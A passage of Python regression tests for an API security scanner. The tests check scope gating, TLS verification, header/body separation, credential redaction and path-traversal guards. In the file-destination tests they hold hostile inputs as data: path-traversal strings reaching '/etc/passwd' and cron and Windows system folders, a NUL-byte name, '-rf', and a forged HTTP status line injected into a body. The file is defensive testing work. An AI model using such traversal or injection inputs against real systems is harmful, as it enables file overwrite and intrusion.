"""Regression tests for the defects raised in external review.

ENGINEERING IMPROVEMENT (review finding 5: "add regression tests for the
specific defects above").

One class per finding, named after it, each asserting the property that was
missing rather than the implementation that now provides it. A test here
failing means a specific, named weakness has come back.

Everything in this file is offline or loopback-only. Nothing in the test suite
sends a packet off the host; `tests/security/test_no_egress.py` asserts that
separately.
"""
import json
import os
import shutil
import tempfile
import unittest

from tests.support import (ROOT, TEST_ENV, auth_for,  # noqa: F401
                           load_profile, test_scope)
from framework.core.errors import (AuthorisationError, PathGuardError,
                                   RegisterError, ScopeViolation,
                                   TransportError)


class TestEveryRequestPassesTheGate(unittest.TestCase):
    """CRITICAL 1. "Apply scope checks to every network request, including
    preflight and proxy probes. A denied request never reaches the network,
    regardless of which command triggers it."

    The gate used to live in Runner.run_case, so preflight, the proxy health
    and CA probes, the fidelity comparison and the rate-limit burst all reached
    the network without consulting a policy. The gate now lives in the
    transport, which is the only thing that opens a socket.
    """

    def setUp(self):
        self.tmp = tempfile.mkdtemp(prefix="apiscan-gate-")
        self.profile = load_profile(base_url="http://127.0.0.1:1/v1")

    def tearDown(self):
        shutil.rmtree(self.tmp, ignore_errors=True)

    def transport(self, policy):
        from framework.core.transport import Transport
        return Transport(self.profile, auth_for(self.profile),
                         body_dir=self.tmp, scope_policy=policy,
                         via_proxy=False)

    def test_a_transport_cannot_exist_without_a_policy(self):
        from framework.core.transport import Transport
        with self.assertRaises(ScopeViolation) as caught:
            Transport(self.profile, auth_for(self.profile), body_dir=self.tmp)
        self.assertIn("scope policy", str(caught.exception))

    def test_an_unlabelled_request_is_denied_by_the_default_policy(self):
        """A caller that declares nothing about its request gets a probe
        marked state_mutating and unclassified, which default-deny refuses.
        An unlabelled request is an unreviewed request."""
        from framework.governance.scope import ScopePolicy
        transport = self.transport(ScopePolicy.default())
        with self.assertRaises(ScopeViolation) as caught:
            transport.send("probe001", "http://127.0.0.1:1/v1/x", body="{}")
        self.assertIn("Nothing was transmitted", str(caught.exception))

    def test_a_denied_probe_writes_no_request_body(self):
        """Refusal happens before anything touches the disk or the wire."""
        from framework.governance.scope import ScopePolicy
        transport = self.transport(ScopePolicy.default())
        try:
            transport.send("probe002", "http://127.0.0.1:1/v1/x", body="{}")
        except ScopeViolation:
            pass
        self.assertFalse(
            os.path.exists(os.path.join(self.tmp, "probe002.req.txt")),
            "a refused request still wrote its body to disk")

    def test_preflight_without_a_policy_sends_nothing(self):
        from automation.preflight import checks as PF
        from tests.fixtures.mock_service import STATE, MockService
        with MockService() as svc:
            profile = load_profile(base_url=svc.base_url, proxy=None)
            before = STATE.requests
            ctx = {"profile": profile, "scope_policy": None,
                   "evidence_root": os.path.join(self.tmp, "ev"),
                   "transport": None}
            results, _ = PF.run(ctx, stop_on_fail=False, quiet=True)
            self.assertEqual(STATE.requests, before,
                             "preflight sent traffic with no scope policy")
            by_id = {r.check_id: r for r in results}
            for check in ("target.reachable", "target.oracle"):
                self.assertNotEqual(by_id[check].status, PF.PASS, check)

    def test_preflight_probes_are_denied_by_the_default_policy(self):
        """The reachability probe is a POST to an endpoint whose handling of an
        empty body is the unknown under test. It is declared state_mutating
        and the default policy therefore refuses it -- NOT VERIFIED, never
        PASS, and never sent."""
        from automation.preflight import checks as PF
        from framework.core.transport import Transport
        from framework.governance.scope import ScopePolicy
        from tests.fixtures.mock_service import STATE, MockService
        with MockService() as svc:
            profile = load_profile(base_url=svc.base_url, proxy=None)
            policy = ScopePolicy.default()
            before = STATE.requests
            ctx = {"profile": profile, "scope_policy": policy,
                   "evidence_root": os.path.join(self.tmp, "ev2"),
                   "transport": Transport(profile, auth_for(profile),
                                          body_dir=self.tmp,
                                          scope_policy=policy,
                                          via_proxy=False)}
            results, _ = PF.run(ctx, stop_on_fail=False, quiet=True)
            self.assertEqual(STATE.requests, before)
            by_id = {r.check_id: r for r in results}
            self.assertEqual(by_id["target.reachable"].status,
                             PF.NOT_VERIFIED)
            self.assertTrue(by_id["target.reachable"].remedy)

    def test_the_rate_limit_module_consults_its_policy_argument(self):
        """It accepted scope_policy and never read it: the parameter read as a
        gate at every call site while the only real check was a boolean the
        caller sets itself."""
        from framework.governance.scope import ScopePolicy
        from framework.modules import rate_limit
        with self.assertRaises(ScopeViolation):
            rate_limit.probe(self.profile, None, None, authorised=True)
        with self.assertRaises(AuthorisationError):
            rate_limit.probe(self.profile, None, None, authorised=True,
                             scope_policy=ScopePolicy.default())

    def test_fidelity_probes_carry_a_declared_payload_class(self):
        """A 200 KB body and a NUL byte are exactly what a scope policy
        governs, so each path is declared separately -- the direct one has to
        be visible to require_proxy."""
        from framework.governance.scope import ScopePolicy
        from tools.proxy import fidelity
        profile = load_profile(base_url="http://127.0.0.1:1/v1",
                               proxy="http://127.0.0.1:1")
        transport = self.transport(ScopePolicy.default())
        transport.profile = profile
        results, unreliable = fidelity.verify(profile, transport)
        self.assertTrue(results)
        for result in results:
            self.assertEqual(result.verdict, "NOT VERIFIED", result.name)
        self.assertTrue(unreliable,
                        "an unverified fidelity probe must mark its payload "
                        "classes undependable, not silently pass")


class TestOneRefusalDoesNotDiscardARun(unittest.TestCase):
    """Defensive property, added while fixing CRITICAL 1.

    The gate is now evaluated twice -- once in the runner for the record, and
    again inside the transport at the moment the socket would open. They
    should always agree. If they ever do not, the safe outcome is that the one
    case is refused and recorded, not that an exception unwinds the loop and
    discards the evidence already captured for every case before it.
    """

    def test_a_transport_refusal_is_recorded_not_raised(self):
        import tempfile as _tempfile
        from framework import runner as RUN
        from framework.corpus.case import Case
        from framework.evidence.store import EvidenceStore
        from framework.governance.scope import ScopePolicy
        tmp = _tempfile.mkdtemp(prefix="apiscan-disagree-")
        try:
            profile = load_profile(base_url="http://127.0.0.1:1/v1")
            store = EvidenceStore(os.path.join(tmp, "evidence"))
            runner = RUN.Runner(profile, auth_for(profile), store,
                                scope_policy=test_scope(), via_proxy=False,
                                delay_s=0)
            # Force the two evaluations to disagree.
            runner.transport.scope = ScopePolicy.default()
            cases = [Case("T01", "resource_create", "reject", "first",
                          body="{}"),
                     Case("T02", "resource_create", "reject", "second",
                          body="{}")]
            records = runner.run(cases)
            self.assertEqual(len(records), 2,
                             "a refusal aborted the run instead of being "
                             "recorded")
            for record in records:
                self.assertFalse(record["executed"])
                self.assertIn("refused at the transport",
                              record["verdict_reason"])
        finally:
            shutil.rmtree(tmp, ignore_errors=True)


class TestHttpsVerification(unittest.TestCase):
    """CRITICAL 2. "Enable HTTPS verification by default. Stop when a
    configured CA file is missing. Invalid certificates cause a clear failure;
    insecure connections require an explicit setting."
    """

    def setUp(self):
        self.tmp = tempfile.mkdtemp(prefix="apiscan-tls-")
        self.profile = load_profile(base_url="https://api.example.com/v1")

    def tearDown(self):
        shutil.rmtree(self.tmp, ignore_errors=True)

    def transport(self):
        from framework.core.transport import Transport
        return Transport(self.profile, auth_for(self.profile),
                         body_dir=self.tmp, scope_policy=test_scope())

    def test_a_profile_that_says_nothing_gets_verification(self):
        self.profile.transport.pop("tls_verify", None)
        args = self.transport().build_args("https://api.example.com/v1/x")
        self.assertNotIn("-k", args)
        self.assertNotIn("--insecure", args)

    def test_a_missing_ca_file_stops_the_run(self):
        self.profile.transport["tls_verify"] = {
            "mode": "ca", "ca_path": os.path.join(self.tmp, "gone.pem")}
        with self.assertRaises(TransportError) as caught:
            self.transport().build_args("https://api.example.com/v1/x")
        message = str(caught.exception)
        self.assertIn("does not exist", message)
        self.assertIn("UNVERIFIED", message,
                      "the error should say what the old behaviour did, "
                      "because that is why this is a hard failure")

    def test_ca_mode_with_no_path_is_refused(self):
        self.profile.transport["tls_verify"] = {"mode": "ca"}
        with self.assertRaises(TransportError):
            self.transport().build_args("https://api.example.com/v1/x")

    def test_an_unknown_mode_is_refused_rather_than_defaulted(self):
        self.profile.transport["tls_verify"] = {"mode": "sort-of"}
        with self.assertRaises(TransportError):
            self.transport().build_args("https://api.example.com/v1/x")

    def test_insecure_is_available_but_must_be_written_down(self):
        self.profile.transport["tls_verify"] = {"mode": "insecure"}
        transport = self.transport()
        self.assertIn("-k", transport.build_args("https://api.example.com/x"))
        self.assertIn("NOT VERIFIED", transport.tls_note())

    def test_the_example_profile_ships_verifying(self):
        """The shipped example is what every engagement is copied from."""
        with open(os.path.join(ROOT, "configs", "examples",
                               "example-callback-api.json")) as fh:
            example = json.load(fh)
        self.assertNotEqual(
            example["transport"]["tls_verify"]["mode"], "insecure",
            "the scaffold must not start every engagement unverified")

    def test_an_insecure_run_is_reported_as_a_limitation(self):
        """Honesty, not just refusal: if an engagement does choose insecure,
        the deliverable has to say the host's identity was never checked."""
        self.profile.transport["tls_verify"] = {"mode": "insecure"}
        self.assertIn("certificate validity was not checked",
                      self.transport().tls_note().lower()
                      .replace("not verified -- ", "")
                      .replace("transport.tls_verify.mode is 'insecure'; ", ""))


class TestHeaderBodySeparation(unittest.TestCase):
    """HIGH 3. "Separate response headers from response bodies when collecting
    traffic. A fake HTTP/1.1 line inside a response cannot alter the parsed
    headers or verdict."

    curl wrote the header dump and the body to the same stream and they were
    separated afterwards by finding the last ^HTTP/\\d line. A body containing a
    forged status line therefore relocated the split and became the headers the
    oracle attributed and the verdict rested on: the target could choose its
    own classification.
    """

    FORGED = ('{"note":"ordinary looking body\\n\\n'
              'HTTP/1.1 200 OK\\nX-Injected: yes\\n\\n'
              'and the real body continues"}')

    def setUp(self):
        self.tmp = tempfile.mkdtemp(prefix="apiscan-split-")

    def tearDown(self):
        shutil.rmtree(self.tmp, ignore_errors=True)

    def test_curl_is_told_to_write_the_two_streams_separately(self):
        from framework.core.transport import Transport
        profile = load_profile(base_url="http://127.0.0.1:1/v1")
        transport = Transport(profile, auth_for(profile), body_dir=self.tmp,
                              scope_policy=test_scope(), via_proxy=False)
        args = transport.build_args("http://127.0.0.1:1/v1/x",
                                    header_file=os.path.join(self.tmp, "h"),
                                    out_file=os.path.join(self.tmp, "b"))
        header_dest = args[args.index("-D") + 1]
        body_dest = args[args.index("-o") + 1]
        self.assertNotEqual(header_dest, body_dest)
        self.assertNotEqual(header_dest, "-")
        self.assertNotEqual(body_dest, "-")

    def test_a_forged_status_line_in_a_body_does_not_become_headers(self):
        from framework.evidence.store import (parse_response_text,
                                              render_response)

        class Response(object):
            status = "403"
            headers = "HTTP/1.1 403 Forbidden\r\nContent-Type: application/json"
            body = TestHeaderBodySeparation.FORGED
            meta = {"curl_rc": 0}

        parsed = parse_response_text(render_response(Response()))
        self.assertEqual(parsed["headers"], Response.headers)
        self.assertEqual(parsed["body"], Response.body)
        self.assertNotIn("X-Injected", parsed["headers"])
        self.assertEqual(parsed["status"], "403")

    def test_crlf_headers_survive_the_round_trip_exactly(self):
        """Universal-newline translation on read would shift every declared
        offset, so the body slice would start inside the headers. Caught by
        the live-versus-reclassified differential test."""
        from framework.evidence.store import EvidenceStore, parse_response_file

        class Response(object):
            status = "200"
            headers = "HTTP/1.1 200 OK\r\nA: 1\r\nB: 2"
            body = '{"x":1}'
            meta = {"curl_rc": 0}

        store = EvidenceStore(os.path.join(self.tmp, "ev"))
        path = store.write_response("CASE01", Response())
        parsed = parse_response_file(path)
        self.assertEqual(parsed["headers"], Response.headers)
        self.assertEqual(parsed["body"], Response.body)

    def test_legacy_evidence_is_parsed_but_flagged_as_heuristic(self):
        """Evidence captured by an earlier version still reads, and says so."""
        from framework.evidence.store import parse_response_text
        legacy = "HTTP 200  (curl rc=0)\n\nA: 1\n\n{\"x\":1}"
        parsed = parse_response_text(legacy)
        self.assertTrue(parsed["legacy_format"])
        self.assertEqual(parsed["status"], "200")


class TestCredentialAndPersonalDataProtection(unittest.TestCase):
    """HIGH 4. "Protect captured credentials and personal data. Shared reports
    are redacted; raw evidence has restricted access and a defined retention
    period." And: "preserve restricted raw originals when necessary and
    produce separate redacted copies."
    """

    def setUp(self):
        self.tmp = tempfile.mkdtemp(prefix="apiscan-redact-")

    def tearDown(self):
        shutil.rmtree(self.tmp, ignore_errors=True)

    def store(self):
        from framework.evidence.store import EvidenceStore
        return EvidenceStore(os.path.join(self.tmp, "evidence"))

    def test_evidence_is_owner_only(self):
        if os.name == "nt":
            self.skipTest("POSIX modes are not meaningful on this platform")

        class Response(object):
            status = "200"
            headers = "A: 1"
            body = "{}"
            meta = {"curl_rc": 0}

        store = self.store()
        path = store.write_response("CASE01", Response())
        store.finalise()
        self.assertEqual(os.stat(path).st_mode & 0o777, 0o600)
        self.assertEqual(os.stat(store.run_dir).st_mode & 0o777, 0o700)

    def test_a_run_records_a_retention_date(self):
        store = self.store()
        manifest = store.finalise()
        self.assertTrue(store.metadata["retain_until"])
        self.assertEqual(manifest["access"]["retention_days"],
                         store.retention_days)

    def test_the_manifest_states_whether_restriction_was_achieved(self):
        """A filesystem that cannot apply POSIX modes must not leave a report
        implying it did."""
        manifest = self.store().finalise()
        self.assertIn("mode_applied", manifest["access"])
        self.assertIn("files_not_restricted", manifest["access"])

    def test_redaction_removes_credentials_from_a_trace(self):
        from framework.evidence import redact as RD
        token = "synthtok-very-secret-value"
        trace = ("=> Send header\n"
                 "x-client-token: %s\n"
                 "Authorization: Bearer %s\n"
                 "<= Recv data\n"
                 '{"echo":"%s"}\n' % (token, token, token))
        redactor = RD.Redactor(secrets=[token])
        out, hits = redactor.apply(trace)
        self.assertNotIn(token, out)
        self.assertTrue(hits)

    def test_redaction_catches_credential_shapes_with_no_profile(self):
        """After an engagement the environment is rightly cleared, so literal
        matching finds nothing. Shape and header matching must still work."""
        from framework.evidence import redact as RD
        jwt = ("eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0."
               "dBjftJeZ4CVPmB92K27uhbUJU1p1r_wW1gFWFOEjXk")
        out, hits = RD.Redactor().apply("Authorization: Bearer %s" % jwt)
        self.assertNotIn(jwt, out)
        self.assertTrue(hits)

    def test_a_redacted_copy_leaves_the_original_verifying(self):
        """Redacting the only original would undermine later verification."""
        from framework.evidence import redact as RD
        from framework.evidence.store import EvidenceStore

        class Response(object):
            status = "200"
            headers = "A: 1"
            body = '{"token":"synthtok-very-secret-value"}'
            meta = {"curl_rc": 0}

        store = self.store()
        store.write_response("CASE01", Response())
        store.record({"case_id": "CASE01", "verdict": "OBSERVED"})
        store.finalise()
        before = EvidenceStore.verify(store.run_dir)
        self.assertEqual(before, [])

        out = os.path.join(self.tmp, "shareable")
        redactor = RD.Redactor(secrets=["synthtok-very-secret-value"])
        manifest = RD.redact_run(store.run_dir, out, redactor)

        self.assertEqual(EvidenceStore.verify(store.run_dir), [],
                         "redaction modified the raw originals")
        self.assertTrue(manifest["artifacts"])
        for entry in manifest["artifacts"]:
            self.assertIn("sha256_original", entry)
            self.assertIn("sha256_redacted", entry)
        shared = os.path.join(out, "CASE01.resp.txt")
        with open(shared) as fh:
            self.assertNotIn("synthtok-very-secret-value", fh.read())

    def test_a_redaction_label_cannot_confirm_a_guessed_value(self):
        from framework.evidence import redact as RD
        redactor = RD.Redactor(secrets=["aaaa-secret-one", "bbbb-secret-two"])
        out, _ = redactor.apply("aaaa-secret-one and bbbb-secret-two")
        self.assertNotIn("aaaa", out)
        self.assertNotIn("bbbb", out)
        # Stable within a run, so a reader can see two occurrences were the
        # same value -- but the label is allocated in order of first sight,
        # not derived from the value, so it cannot confirm a guess.
        first, _ = redactor.apply("aaaa-secret-one")
        second, _ = redactor.apply("aaaa-secret-one")
        self.assertEqual(first, second)
        self.assertTrue(first.startswith("[REDACTED:credential:"))
        other, _ = redactor.apply("bbbb-secret-two")
        self.assertNotEqual(first, other)


class TestFileDestinationValidation(unittest.TestCase):
    """HIGH 5. "Validate resolved file destinations before writing. Case IDs,
    imported filenames, and maintenance updates cannot escape their intended
    folders on Windows or Linux."
    """

    TRAVERSALS = ("../../etc/cron.d/x", "..", "a/b", "a\\b",
                  "..\\..\\windows\\system32\\x", "C:\\x", "/etc/passwd",
                  "NUL", "con.txt", "\x00evil", ".hidden", "-rf")

    def setUp(self):
        self.tmp = tempfile.mkdtemp(prefix="apiscan-paths-")

    def tearDown(self):
        shutil.rmtree(self.tmp, ignore_errors=True)

    def test_a_case_id_is_validated_where_it_enters_the_model(self):
        from framework.corpus.case import Case
        for bad in self.TRAVERSALS:
            with self.assertRaises(PathGuardError, msg=repr(bad)):
                Case(bad, "endpoint", "reject", "traversal attempt")

    def test_an_evidence_path_cannot_leave_its_run_directory(self):
        from framework.evidence.store import EvidenceStore
        store = EvidenceStore(os.path.join(self.tmp, "evidence"))
        for bad in self.TRAVERSALS:
            with self.assertRaises(PathGuardError, msg=repr(bad)):
                store.path(bad, "resp")

    def test_a_stored_evidence_path_is_resolved_under_the_evidence_root(self):
        """`capture` reads these out of results.json, which is a file."""
        from framework.core.pathguard import safe_relative_join
        with self.assertRaises(PathGuardError):
            safe_relative_join(self.tmp, "../../../etc/passwd")
        with self.assertRaises(PathGuardError):
            safe_relative_join(self.tmp, "run\\..\\..\\escape.txt")
        inside = safe_relative_join(self.tmp, "20260101-000000/CASE01.resp.txt")
        self.assertTrue(inside.startswith(os.path.realpath(self.tmp)))

    def test_windows_shaped_escapes_are_refused_on_every_platform(self):
        """A path inert on POSIX can escape on Windows, and evidence travels
        between them."""
        from framework.core.pathguard import safe_component
        for bad in ("a\\b", "..\\..\\x", "C:x", "NUL", "COM1.txt"):
            with self.assertRaises(PathGuardError, msg=bad):
                safe_component(bad)

    def test_an_intake_candidate_cannot_write_outside_the_framework(self):
        from automation.maintenance import intake
        for bad in ("../outside.py", "..\\..\\outside.py",
                    "framework\\..\\..\\outside.py"):
            candidate = intake.Candidate(
                "escape", {bad: "x = 1\n"}, rationale="test")
            result = intake.gate_isolation(candidate, ROOT)
            self.assertEqual(result.status, intake.FAIL, bad)

    def test_an_intake_candidate_may_still_name_an_ordinary_dunder_file(self):
        """The guard must not be so strict it refuses __init__.py."""
        from automation.maintenance import intake
        candidate = intake.Candidate(
            "ordinary", {"framework/oracle/__init__.py": "\n"},
            rationale="test")
        self.assertEqual(intake.gate_isolation(candidate, ROOT).status,
                         intake.PASS)

    def test_a_tampered_snapshot_manifest_cannot_write_outside_the_tree(self):
        from automation.maintenance import snapshot
        store = os.path.join(self.tmp, "snaps")
        snap = os.path.join(store, "20260101-000000-tampered")
        os.makedirs(os.path.join(snap, "tree"), exist_ok=True)
        with open(os.path.join(snap, "manifest.json"), "w") as fh:
            json.dump({"id": "20260101-000000-tampered", "label": "t",
                       "files": [{"path": "../../escaped.py",
                                  "sha256": "0", "bytes": 1}]}, fh)
        target = os.path.join(self.tmp, "fake-framework")
        os.makedirs(target, exist_ok=True)
        with self.assertRaises(ValueError) as caught:
            snapshot.rollback("20260101-000000-tampered", store=store,
                              root=target, safety_snapshot=False)
        self.assertIn("outside the framework tree", str(caught.exception))
        self.assertFalse(os.path.exists(
            os.path.join(self.tmp, "escaped.py")))


class TestConservativeDefaultMode(unittest.TestCase):
    """REVIEW 2. "Make the default testing mode genuinely conservative. The
    current default policy allows some injection, oversized, and malformed
    requests. Those can still affect a vulnerable application even when a case
    is labelled non-mutating."
    """

    def test_the_default_policy_denies_damaging_payload_classes(self):
        from framework.governance.scope import DEFAULT_DENY
        for klass in ("injection", "oversize", "malformed"):
            self.assertIn(klass, DEFAULT_DENY)

    def test_a_default_scope_run_sends_nothing_at_all(self):
        from framework.corpus.generators import families as F
        from framework.corpus.generators import phases as P
        from framework.corpus.generators import retest as R
        from framework.governance.scope import ScopePolicy
        profile = load_profile(base_url="https://api.example.com/v1")
        auth = auth_for(profile)
        cases = (R.baseline_cases(profile)
                 + F.generate(profile, auth_provider=auth)
                 + P.generate(profile, auth))
        permitted, denied = ScopePolicy.default().filter(cases)
        # Precisely: nothing that writes is permitted. 4 of the 352 cases use
        # a read method (GET/HEAD/OPTIONS/TRACE method-tampering probes) and
        # those are genuinely non-mutating, so they stay permitted. Everything
        # that could change data is denied -- including the 156 POSTs the
        # generators annotate state_mutating=False.
        from framework.governance.scope import WRITE_METHODS
        writes = [c for c in permitted if c.method.upper() in WRITE_METHODS]
        self.assertEqual(writes, [],
                         "the default policy permitted %d case(s) that write"
                         % len(writes))
        self.assertTrue(denied)
        self.assertLess(len(permitted), 10,
                        "the default policy permitted %d of %d cases"
                        % (len(permitted), len(cases)))
        for case in permitted:
            self.assertIn(case.method.upper(),
                          ("GET", "HEAD", "OPTIONS", "TRACE"), case.id)

    def test_a_non_mutating_annotation_does_not_unlock_a_post(self):
        """The reviewer's exact point: a payload "can still affect a
        vulnerable application even when a case is labelled non-mutating"."""
        from framework.governance.scope import Probe, ScopePolicy
        permitted, reason = ScopePolicy.default().evaluate(
            Probe("p", method="POST", state_mutating=False,
                  payload_class="structure"))
        self.assertFalse(permitted)
        self.assertIn("write method POST", reason)

    def test_the_scaffolded_policy_matches_the_framework_default(self):
        """A new engagement must not start from a weaker policy than the
        framework's own."""
        import automation.cli.main as CLI
        from framework.governance.scope import DEFAULT_DENY
        tmp = tempfile.mkdtemp(prefix="apiscan-scaffold-")
        try:
            eng = os.path.join(tmp, "engagement")
            self.assertEqual(CLI.main(["init-engagement", eng]), 0)
            with open(os.path.join(eng, "scope-policy.json")) as fh:
                scope = json.load(fh)
            self.assertEqual(sorted(scope["deny_classes"]),
                             sorted(DEFAULT_DENY))
            self.assertEqual(scope["authorisations"], [])
            self.assertTrue(scope.get("retention_days"))
        finally:
            shutil.rmtree(tmp, ignore_errors=True)

    def test_there_are_three_declared_modes(self):
        from framework.governance import modes as M
        self.assertEqual(set(M.ALL),
                         {"offline-review", "limited-live", "active"})
        self.assertEqual(M.DEFAULT, "limited-live",
                         "an omitted --mode must narrow a run, not widen it")

    def test_offline_review_cannot_send(self):
        from framework.governance import modes as M
        with self.assertRaises(ScopeViolation):
            M.get("offline-review").assert_may_send()

    def test_limited_live_requires_an_explicit_selection(self):
        from framework.governance import modes as M
        mode = M.get("limited-live")
        with self.assertRaises(ScopeViolation):
            mode.assert_selection({})
        self.assertTrue(mode.assert_selection({"families": "B"}))

    def test_no_authorisation_lifts_a_modes_refusal(self):
        """A cautious mode that an entry in the same engagement's policy file
        could override would be a suggestion, not a safety property."""
        from framework.governance import modes as M
        from framework.governance.scope import Probe, ScopePolicy
        policy = ScopePolicy({
            "schema": "scope-policy/1",
            "deny_classes": ["injection"],
            "authorisations": [{
                "classes": ["injection", "volumetric", "oversize"],
                "authorised_by": "Someone", "authorised_on": "2026-01-01",
                "reference": "ref"}]})
        case = Probe("x", state_mutating=False, payload_class="injection")
        self.assertTrue(policy.evaluate(case)[0],
                        "the authorisation should satisfy the POLICY")
        limited = policy.with_mode(M.get("limited-live"))
        permitted, reason = limited.evaluate(case)
        self.assertFalse(permitted)
        self.assertIn("engagement mode", reason)
        self.assertTrue(policy.with_mode(M.get("active")).evaluate(case)[0])

    def test_operator_limits_only_ever_tighten(self):
        from framework.governance import modes as M
        limits = M.get("limited-live").limits
        self.assertEqual(limits.replace(max_cases=5).max_cases, 5)
        self.assertEqual(limits.replace(max_cases=100000).max_cases,
                         limits.max_cases,
                         "--max-cases must not be able to raise the ceiling")
        self.assertEqual(limits.replace(min_delay_s=0.0).min_delay_s,
                         limits.min_delay_s,
                         "--delay-s must not be able to lower the floor")

    def test_repeated_server_errors_stop_the_run(self):
        from framework.governance.limits import Budget, RunLimits
        budget = Budget(RunLimits(max_consecutive_server_errors=3)).start()
        for _ in range(2):
            self.assertIsNone(budget.observe(status="500"))
        self.assertTrue(budget.observe(status="500"))
        self.assertFalse(budget.check()[0])
        self.assertIn("consecutive server errors", budget.check()[1])

    def test_a_transport_failure_counts_as_a_server_error(self):
        from framework.governance.limits import Budget, RunLimits
        budget = Budget(RunLimits(max_consecutive_server_errors=2)).start()
        budget.observe(status="000")
        self.assertTrue(budget.observe(status="000"))

    def test_excessive_latency_stops_the_run(self):
        from framework.governance.limits import Budget, RunLimits
        budget = Budget(RunLimits(max_consecutive_slow=2,
                                  slow_response_s=5.0)).start()
        budget.observe(status="200", elapsed_s="6.0")
        self.assertTrue(budget.observe(status="200", elapsed_s="7.5"))
        self.assertIn("degrading", budget.check()[1])

    def test_a_stopped_run_is_incomplete_not_complete(self):
        from framework.findings.coverage import Coverage
        from framework.runner import NOT_REACHED
        records = [
            {"case_id": "BASE-x", "verdict": "CONTROL-PRESENT",
             "executed": True},
            {"case_id": "A01", "verdict": NOT_REACHED, "executed": False},
        ]
        coverage = Coverage(records, baseline_ok=True,
                            not_established=["something"])
        self.assertEqual(coverage.status(), "INCOMPLETE")
        tally = coverage.tally()
        self.assertEqual(tally["not_reached_run_stopped"], 1)
        self.assertEqual(tally["skipped_out_of_scope"], 0,
                         "a run that stopped early must not be counted as an "
                         "engagement exclusion")
        self.assertTrue(any("stop condition" in p or "never sent" in p
                            for p in coverage.validate()))


class TestThePlanIsShownBeforeExecution(unittest.TestCase):
    """REVIEW 2. "Before execution, show the actual destination, endpoints,
    identities, request count, and potentially data-changing operations."
    """

    def setUp(self):
        from framework.corpus.generators import families as F
        from framework.corpus.generators import retest as R
        from framework.governance import modes as M
        from framework.governance import plan as PLAN
        self.profile = load_profile(base_url="https://api.example.com/v1")
        cases = (R.baseline_cases(self.profile)
                 + F.generate(self.profile,
                              auth_provider=auth_for(self.profile)))
        mode = M.get("active")
        self.plan = PLAN.build(self.profile, cases,
                               test_scope().with_mode(mode), mode=mode,
                               limits=mode.limits, via_proxy=False)
        self.text = PLAN.render(self.plan)

    def test_it_states_the_actual_destination(self):
        self.assertEqual(self.plan["destination"]["host"], "api.example.com")
        self.assertEqual(self.plan["destination"]["port"], 443)
        self.assertIn("api.example.com", self.text)

    def test_it_states_identities_endpoints_and_counts(self):
        self.assertTrue(self.plan["identities"])
        self.assertTrue(self.plan["endpoints"])
        self.assertGreater(self.plan["requests"]["will_be_sent"], 0)
        self.assertIn("WILL BE SENT", self.text)

    def test_it_lists_the_operations_that_may_change_data(self):
        self.assertTrue(self.plan["data_changing_operations"])
        self.assertEqual(self.plan["requests"]["data_changing"],
                         len(self.plan["data_changing_operations"]))
        self.assertIn("MAY CHANGE DATA", self.text)

    def test_it_states_the_ceilings_and_stop_conditions(self):
        self.assertTrue(self.plan["limits"])
        self.assertIn("stop after", self.text)

    def test_it_resolves_no_credential_value(self):
        """The plan is a document that gets pasted into an approval e-mail."""
        blob = json.dumps(self.plan)
        for value in TEST_ENV.values():
            self.assertNotIn(value, blob)

    def test_it_says_nothing_has_been_sent(self):
        self.assertTrue(self.plan["nothing_sent_yet"])
        self.assertIn("nothing has been sent", self.text)


class TestFindingsAreHardToMisinterpret(unittest.TestCase):
    """REVIEW 4. "A rejected request does not necessarily prove a security
    control worked, and an accepted request does not necessarily prove
    exploitation."
    """

    RECORDS = [
        {"case_id": "BASE-create", "verdict": "CONTROL-PRESENT",
         "executed": True, "endpoint": "create", "identity": "primary",
         "detector_hits": [], "state_mutating": True,
         "response_file": "BASE-create.resp.txt"},
        {"case_id": "A01", "verdict": "CONTROL-ABSENT", "executed": True,
         "endpoint": "create", "payload_class": "identifier",
         "layer": "accepted_success", "severity_if_accepted": "High",
         "detector_hits": [], "state_mutating": True,
         "response_file": "A01.resp.txt"},
    ]

    def test_a_defect_cannot_be_created_at_suspected_confidence(self):
        from framework.findings.register import Entry
        with self.assertRaises(RegisterError) as caught:
            Entry("D-01", "t", kind="DEFECT", confidence="suspected")
        self.assertIn("REPRODUCED", str(caught.exception))

    def test_machine_promotion_produces_suspected_unresolved_rows(self):
        from framework.findings.register import Register
        register = Register(records=self.RECORDS)
        register.promote_machine_findings()
        register.build()
        self.assertEqual(register.confirmed(), [],
                         "an automated verdict was published as a confirmed "
                         "defect")
        promoted = [e for e in register.entries if e.provenance == "MACHINE"]
        self.assertTrue(promoted)
        for entry in promoted:
            self.assertEqual(entry.kind, "UNRESOLVED")
            self.assertEqual(entry.confidence, "suspected")
            self.assertTrue(entry.expected_behaviour)
            self.assertTrue(entry.observed_behaviour)
            self.assertTrue(entry.alternative_explanations)
            self.assertTrue(entry.limitations)

    def test_a_machine_finding_claims_no_impact_it_did_not_observe(self):
        from framework.findings.register import Register
        register = Register(records=self.RECORDS)
        register.promote_machine_findings().build()
        promoted = [e for e in register.entries
                    if e.provenance == "MACHINE"][0]
        self.assertTrue(promoted.impact.startswith("IF "),
                        "an impact statement for an unproven finding must be "
                        "conditional; got %r" % promoted.impact[:60])

    def test_a_baseline_is_derived_into_every_finding(self):
        from framework.findings.register import Register
        register = Register(records=self.RECORDS)
        register.promote_machine_findings().build()
        entry = [e for e in register.entries if e.provenance == "MACHINE"][0]
        self.assertIn("BASE-create", entry.baseline_reference)
        self.assertIn("primary", entry.baseline_reference,
                      "the baseline's identity is part of what makes it a "
                      "baseline")

    def test_unverified_state_change_is_said_out_loud(self):
        from framework.findings.register import Register
        register = Register(records=self.RECORDS)
        register.promote_machine_findings().build()
        entry = [e for e in register.entries if e.provenance == "MACHINE"][0]
        self.assertIn("NOT VERIFIED", entry.state_verification)

    def test_a_defect_missing_its_elements_is_not_issuable(self):
        from framework.findings.coverage import Coverage
        from framework.findings.register import Entry, Register
        from framework.reporting.model import ReportModel
        register = Register(records=self.RECORDS)
        register.add(Entry("D-01", "t", kind="DEFECT",
                           confidence="reproduced", case_ids=["A01"]))
        register.build()
        model = ReportModel("eng", "target", register,
                            Coverage(self.RECORDS, baseline_ok=True,
                                     not_established=["x"]),
                            records=self.RECORDS, scope_note="note")
        problems = model.validate()
        self.assertFalse(model.is_issuable())
        for want in ("expected_behaviour", "observed_behaviour",
                     "alternative_explanations"):
            self.assertTrue(any(want in p for p in problems), want)

    def test_a_complete_defect_is_issuable(self):
        from framework.findings.coverage import Coverage
        from framework.findings.register import Entry, Register
        from framework.reporting.model import ReportModel
        register = Register(records=self.RECORDS)
